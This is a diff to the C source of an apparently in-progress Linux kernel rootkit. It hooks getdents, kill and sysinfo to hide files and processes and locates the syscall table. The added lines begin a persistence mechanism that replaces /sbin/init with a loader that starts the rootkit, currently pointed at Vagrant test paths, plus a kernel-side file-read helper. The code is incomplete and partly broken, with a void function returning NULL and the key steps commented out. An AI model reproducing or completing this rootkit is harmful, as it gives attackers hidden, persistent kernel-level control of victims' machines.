@@ -30,8 +30,17 @@
 
 // this is the filename we want to hide
 // used in hacked_getdents(...)
-#define TO_HIDE "dog.txt"
+#define TO_HIDE "test_file.txt"
 char hidePID[6] = "-1";
+
+// this is the c file which will replace /sbin/init
+// - it loads the rootkit then runs the original /sbin/init
+#define FILE_INIT_REPLACEMENT_C "start_rootkit.c"
+// #define FILE_INIT               "/sbin/init"
+// #define FILE_INIT_ORIGINAL      "/sbin/init_original"
+
+#define FILE_INIT               "/vagrant/init_temp"
+#define FILE_INIT_ORIGINAL      "/vagrant/init_temp_original"
 
 asmlinkage int (*original_sysinfo)(struct sysinfo *);
 asmlinkage int (*original_kill)(pid_t, int);
@@ -160,22 +169,6 @@ asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsig
 // given a filename w/ path, replaces with just filename
 // returns string w/o path
 const char* strip_filepath(const char* filepath) {
-    // int i, replace_i;
-    // // try to find a '/'
-    // for(i = 0; i < strlen(filepath), i++) {
-    //     // get ready to copy over to the start of the string next loop
-    //     if (filepath[i] == '/') {
-    //         replace_i = 0;
-
-    //         break;   
-    //     }
-    //     // else, move everything after to the start & end with a null terminator
-    //     if (replace_i != -1) {
-
-    //     }
-    // }
-    // if we don't find one - return as per usual
-
     const char* loc = strrchr(filepath, '/');
     if (loc == NULL) {
         // there is no path - only a filename
@@ -255,4 +248,73 @@ void **find_syscall_table(void)
     }
 
     return NULL;
+}
+
+// ref: https://www.linuxjournal.com/article/8110
+//      https://en.it1352.com/article/bd12740c86574c22aff0e5b2b89680e4.html
+// could have done this with function pointers? using lower level stuff tho
+void clone_file(const char* filepath_1, const char* filepath_2) {
+    int fd, ret;
+    unsigned char buf[100];
+
+    // mm_segment_t old_fs = get_fs();
+    // set_fs(USER_DS);
+
+    // fd = sys_open(filepath_1, O_RDONLY, 0);
+    // if (fd >= 0) {
+    //     // read
+    //     while (sys_read(fd, buf, 1) == 1) {
+    //         printk("%c", buf[0]);
+    //     }
+    //     printk("\n");
+    //     sys_close(fd);
+    // }
+
+    // set_fs(old_fs);
+
+    struct file *filp = NULL;
+    int err = 0;
+
+    mm_segment_t old_fs = get_fs();
+    set_fs(get_ds());
+    filp = filp_open(filepath_1, O_RDONLY, 0);
+
+    if (IS_ERR(filp)) {
+        err = PTR_ERR(filp);
+        return NULL;
+    }
+
+    ret = vfs_read(filp, buf, 100, 0);
+
+    set_fs(old_fs);
+
+    int i;
+    for (i = 0; i < 100; i++) {
+        printk("%c", buf[i]);
+    }
+    printk("\n");
+}
+
+// most of this should only be executed on the first
+// run (ideally)
+// - should this be done in our payload instead?
+//   doing file I/O is bad in kernel modules
+void add_to_reboot() {
+    clone_file("/home/vagrant/dog.txt", "");
+
+    // check for existence of /sbin/init_original
+    // if (!access(FILE_INIT_ORIGINAL, R_OK) == 0) {
+        // no  -> copy /sbin/init -> /sbin/init_original
+        
+        // char copy_command[4 + strlen(FILE_INIT) + strlen(FILE_INIT_ORIGINAL)];
+        // sprintf(copy_command, "cp %s %s", FILE_INIT, FILE_INIT_ORIGINAL);
+        // int return_copy = system(copy_command);
+        
+        //     -> compile start_rootkit.c -> /sbin/init
+        // char compile_command[8 + strlen(FILE_INIT_REPLACEMENT_C) + strlen(FILE_INIT)];
+        // sprintf(compile_command, "gcc %s -o %s", FILE_INIT_REPLACEMENT_C, FILE_INIT);
+
+        //     -> move our replacement init -> /sbin/init
+
+    // }
 }
